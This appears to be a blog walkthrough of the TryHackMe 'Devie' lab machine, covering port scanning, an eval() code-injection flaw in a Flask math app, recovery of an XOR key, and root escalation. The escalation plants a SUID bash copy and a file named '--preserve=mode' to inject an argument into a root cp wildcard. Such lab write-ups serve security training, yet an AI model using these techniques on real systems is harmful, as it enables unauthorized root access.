---
title: "Devie THM Medium"
layout: page
date: 2023-04-11
image: https://miro.medium.com/max/786/0*Wr3Tm8LvmG57ES_2.webp
headerImage: false
tag:
- TRYHACKME DEVIE WALKTHROUGH
- DEVIE WRITEUP
- DEVIE TRYHACKME WALKTHROUGH
star: true
category: blog
author: Hashar Mujahid
description: Hi This Blog is the writeup of DEVIE Machine from TRYHACKME.
---

![](https://tryhackme-images.s3.amazonaws.com/room-icons/d7a57cca442e6309f73c9245f40ee950.png)

# NETWORK ENUMERATION:

## PORTSCAN.

```bash
 ╭─hax13@ZARB in ~/Documents/ctfs/thm/devie took 7ms                                                                                   
 ╰─λ sudo nmap -sC -sV -p- --min-rate 1500 10.10.19.243 -oN tcp-scan.txt                                                               
[sudo] password for hax13:                                                                                                             
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-11 10:55 PKT                                                                        
Warning: 10.10.19.243 giving up on port because retransmission cap hit (10).                                                           
Stats: 0:02:21 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan                                                            
Service scan Timing: About 50.00% done; ETC: 10:58 (0:01:16 remaining)                                                                 
Nmap scan report for 10.10.19.243                                                                                                      
Host is up (0.18s latency).                                                                                                            
Not shown: 65533 closed tcp ports (reset)                                                                                              
PORT     STATE SERVICE VERSION                                                                                                         
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)                                                    
| ssh-hostkey:                                                                                                                         
|   3072 c9727bf5b62ed5995614de43093a6492 (RSA)                                                                                        
|   256 0b75585ab9f75ba9ffefad71c1090a33 (ECDSA)                                                                                       
|_  256 7df9c9f867f9954e016823a47b8c9830 (ED25519)                                                                                     
5000/tcp open  upnp?                                                                                                                   
| fingerprint-strings:                                                                                                                 
|   GetRequest:                                                                                                                        
|     HTTP/1.1 200 OK                                                                                                                  
|     Server: Werkzeug/2.1.2 Python/3.8.10                                                                                             
|     Date: Tue, 11 Apr 2023 05:56:32 GMT                                                                                              
|     Content-Type: text/html; charset=utf-8                                                                                           
|     Content-Length: 4486                                                                                                             
|     Connection: close                                                                                                                
|     <!doctype html>                                                                                                                  
|     <html lang="en">                                                                                                                 
|     <head>                                                                                                                           
|     <meta name="viewport" content="width=device-width, initial-scale=1">                                                      [39/69]
|     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-+0n0xVW2e
SR5OomGNYDnhzAbDsOXxcvSN1TPprVMTNDbiYZCxYbOOl7+AMvyTG2x" crossorigin="anonymous">
|     <title>Math</title>
|     </head>
|     <body>
|     id="title">Math Formulas</p>
|     <main>
|     <section> <!-- Sections within the main -->
|     id="titles"> Feel free to use any of the calculators below:</h3>
|     <br>
|     <article> <!-- Sections within the section -->
|     id="titles">Quadratic formula</h4> 
|     <form met
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap
.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.93%I=7%D=4/11%Time=6434F690%P=x86_64-pc-linux-gnu%r(Ge
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 174.12 seconds

```

# WEB ENUMERATION:

![](https://i.imgur.com/YfJGNrM.png)

Let's review the source code.

```python
def bisect(xa,xb):
added = xa + " + " + xb

c = eval(added)
c = int(c)/2
ya = (int(xa)**6) - int(xa) - 1 #f(a)
yb = (int(xb)**6) - int(xb) - 1 #f(b)
```

We can see the eval statement so we can exploit it for code execution.
![](https://i.imgur.com/E2Pvbtc.png)

On attacker side.
![](https://i.imgur.com/0iuZekk.png)

# FOOTHOLD

![](https://i.imgur.com/MXV2zll.png)

On the attacker side.
![](https://i.imgur.com/BVGJTua.png)

# PRIVESC [GORDON]

![](https://i.imgur.com/GbS5Xvh.png)

let's run sudo -l to find if  we have prives for running the script.

Let's run the script .
![](https://i.imgur.com/snv3adm.png)

Now let's open cyberchef and decode i sequentialy.
![](https://i.imgur.com/xoXiqs5.png)

![](https://i.imgur.com/XexN6US.png)

![](https://i.imgur.com/yNPCVtf.png)

`supersecretkeyxorxor`

![](https://i.imgur.com/5mp9tDP.png)

Now let's login as gordon
![](https://i.imgur.com/wk87rgW.png)

# PRIVESC [ROOT]

Let's transfer pspy64 and run it.

![](https://i.imgur.com/YMd7uiw.png)

Let's view the code.
![](https://i.imgur.com/3q9yJDU.png)

We can try to copy the `/bin/bash` in reprots and add a suid bit.
```bash
gordon@devie:~/reports$ cp /bin/bash .
gordon@devie:~/reports$ ls                                                                                                      [41/41]
bash  report1  report2  report3                                                                                                        
gordon@devie:~/reports$ chmod 4775 bash                                                                                                
gordon@devie:~/reports$ ls                                                                                                             
bash  report1  report2  report3                                                                                                        
gordon@devie:~/reports$ ls -l                                                                                                          
total 1168                                                                                                                             
-rwsrwxr-x 1 gordon gordon 1183448 Apr 11 09:21 bash                                                                                   
-rw-r--r-- 1    640 gordon      57 Feb 19 23:31 report1                                                                                
-rw-r--r-- 1    640 gordon      72 Feb 19 23:32 report2                                                                                
-rw-r--r-- 1    640 gordon     100 Feb 19 23:33 report3                                                                                
gordon@devie:~/reports$ touch ./--preserve=mode                                                                                        
gordon@devie:~/reports$ ls                                                                                                             
 bash  '--preserve=mode'   report1   report2   report3                                                                                 
gordon@devie:~/reports$ ls -la                                                                                                         
total 1176                                                                                                                             
drwxrwx--- 2 gordon gordon    4096 Apr 11 09:25  .                                                                                     
drwxr-xr-x 5 gordon gordon    4096 Apr 11 09:21  ..                                                                                    
-rwsrwxr-x 1 gordon gordon 1183448 Apr 11 09:21  bash                                                                                  
-rw-rw-r-- 1 gordon gordon       0 Apr 11 09:25 '--preserve=mode'                                                                      
-rw-r--r-- 1    640 gordon      57 Feb 19 23:31  report1                                                                               
-rw-r--r-- 1    640 gordon      72 Feb 19 23:32  report2                                                                               
-rw-r--r-- 1    640 gordon     100 Feb 19 23:33  report3  
```

We need to create a --preserver=mode file so permissions are preserved.
![](https://i.imgur.com/teTkhW3.png)


We can see we have successfuly rooted the machine.
